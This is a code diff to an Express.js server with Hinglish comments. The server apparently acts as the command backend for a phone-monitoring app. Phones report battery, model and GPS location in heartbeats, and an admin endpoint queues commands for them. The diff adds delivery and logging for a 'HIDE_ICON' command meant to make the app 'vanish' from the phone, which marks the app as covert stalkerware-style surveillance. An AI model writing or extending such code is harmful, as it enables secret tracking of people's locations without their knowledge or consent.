@@ -119,7 +119,7 @@ app.get('/api/device-status/:id', (req, res) => {
     res.json({ ...device, isOnline: isOnline });
 });
 
-// PHONE PING (Heartbeat)
+// PHONE PING (Heartbeat) - App ye hit karega command lene ke liye
 app.post('/api/status', (req, res) => {
     try {
         let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
@@ -130,9 +130,17 @@ app.post('/api/status', (req, res) => {
         
         // Command Check (Agar admin ne kuch bheja hai)
         let pendingCommand = "none";
+        
+        // Check karte hain agar koi command (Jaise HIDE_ICON) queue me hai
         if (devicesStatus[id] && devicesStatus[id].command) {
             pendingCommand = devicesStatus[id].command;
-            devicesStatus[id].command = "none"; 
+            
+            // Console me confirm karo ki command deliver ho gayi
+            if(pendingCommand === 'HIDE_ICON') {
+                console.log(`⚠️ [SERVER] HIDE_ICON Delivered to ${id}. App should vanish now.`);
+            }
+
+            devicesStatus[id].command = "none"; // Command bhej diya, ab clear kar do
         }
 
         // RAM Data Update
@@ -157,15 +165,25 @@ app.post('/api/status', (req, res) => {
     }
 });
 
+// ADMIN COMMAND SENDER (Website se yahan aayega)
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
     
     const id = device_id.toUpperCase().trim();
+    
+    // Agar device pehle se memory me nahi hai, to add kar lo
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     
+    // Command set kar do (Phone next ping me utha lega)
     devicesStatus[id].command = command;
-    console.log(`🚀 [ADMIN] Command '${command}' sent to ${id}`);
+    
+    if (command === 'HIDE_ICON') {
+        console.log(`👁️‍🗨️ [ADMIN] HIDE REQUEST RECEIVED for ${id}`);
+    } else {
+        console.log(`🚀 [ADMIN] Command '${command}' sent to ${id}`);
+    }
+    
     res.json({ status: "success", command: command });
 });
 
